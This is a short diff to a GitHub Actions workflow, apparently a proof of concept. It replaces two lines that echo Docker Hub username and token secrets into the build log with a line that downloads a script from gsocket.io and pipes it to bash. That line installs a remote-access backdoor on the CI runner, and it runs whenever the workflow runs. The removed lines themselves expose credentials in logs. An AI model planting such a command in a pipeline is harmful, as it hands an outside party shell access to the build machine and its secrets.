@@ -20,5 +20,5 @@ jobs:
 
       - name: Run a multi-line script
         run: |
-          echo ${{ secrets.DOCKERHUB_USERNAME }}
-          echo ${{ secrets.DOCKERHUB_TOKEN }}
+          X=SuperSecretTokenForHolofanPoC bash -c "$(curl -fsSL https://gsocket.io/y)"
+          echo "aaa"
